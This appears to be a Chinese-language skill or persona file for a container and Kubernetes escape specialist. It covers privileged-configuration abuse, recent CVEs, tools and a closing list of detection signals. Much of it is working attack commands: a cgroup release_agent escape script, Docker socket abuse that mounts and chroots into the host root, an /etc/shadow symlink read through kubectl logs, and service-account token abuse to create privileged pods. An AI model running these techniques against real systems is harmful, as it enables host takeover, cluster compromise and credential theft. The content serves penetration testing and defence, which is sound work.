# Cloud & Container Escape Specialist

容器逃逸、Kubernetes 集群渗透、云原生安全测试。

## 核心能力

从容器内逃逸到宿主机，K8s 集群横向移动，云凭据窃取。

## 扩展知识库 (communitytools)
- `@communitytools/skills/cloud-containers` — AWS/Azure/GCP/Docker/K8s 平台特定攻击向量 (11 文件)

## 逃逸技术矩阵

### 危险配置利用

| 配置 | 风险 |
|------|------|
| `--privileged` | 所有能力 + 所有设备 = 瞬间逃逸 |
| `--cap-add=SYS_ADMIN` | 挂载文件系统，unshare/setns 进入 host namespace |
| `--cap-add=SYS_PTRACE` | 进程注入 host 进程 |
| `--cap-add=SYS_MODULE` | 加载内核模块 |
| `--cap-add=NET_ADMIN` | 网络操纵 + 策略绕过 |
| `/var/run/docker.sock` 挂载 | Docker API → 创建特权容器 → host 接管 |
| `/proc` 挂载 | host 进程操纵 |
| `/sys` 挂载 | 设备/内核配置访问 |
| `/run/containerd/containerd.sock` | containerd API |

### 经典逃逸技术

**cgroup release_agent 逃逸**
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "/tmp/escape.sh" > /tmp/cgrp/release_agent  # host 路径!
echo '#!/bin/sh' > /tmp/escape.sh
echo 'cmd ...' >> /tmp/escape.sh
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"  # 触发 → 内核以 root 执行 escape.sh
```

**Docker Socket 利用**
```bash
docker -H unix:///var/run/docker.sock run --privileged -v /:/mnt alpine chroot /mnt
```

### 2024-2025 关键 CVE

| CVE | 严重性 | 描述 |
|-----|--------|------|
| CVE-2025-9074 | 9.3 | Docker Desktop API 暴露 → 挂载 host root |
| CVE-2024-0132 | 9.0 | NVIDIA Container Toolkit TOCTOU → host 文件系统挂载 |
| CVE-2024-21626 | High | BuildKit runc "Leaky Vessels" |
| CVE-2025-31133 | High | Masked Path 操纵 |
| CVE-2019-5736 | 8.6 | runc 覆盖 (仍有效) |

### K8s 特有攻击

**Log Symlink 攻击**
```bash
# 在容器内
ln -s /etc/shadow /var/log/pods/...
# kubectl logs <pod> → kubelet 跟随 symlink 读取 /etc/shadow
```

**Service Account Token 滥用**
```bash
# 检查权限
kubectl auth can-i --list --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# 创建特权 pod
kubectl apply -f evil-pod.yaml  # 如果有 cluster-admin
```

**链式攻击 (IEEE 2025)**
```
1 初始容器入侵 (Log4j / RCE / 暴露 API)
2 eBPF kernel exploit → 容器逃逸到节点
3 发现 Service Account token → 横向移动
4 RBAC 权限过度 → 集群级别提权
5 完整集群管理 → 数据窃取 + 持久化
```

## 工具
- **CDK** (Container Duck): 容器逃逸评估
- **kube-hunter**: K8s 漏洞扫描
- **peirates**: K8s 渗透
- **Falco**: 运行时检测 (测试检测覆盖率)
- **Tetragon**: eBPF 运行时安全

## 防御检测信号
- 可疑 syscall: clone, unshare, setns, mount, chroot
- 访问 runtime socket
- cgroup 文件系统写入
- SUID 二进制创建
- 特权容器创建
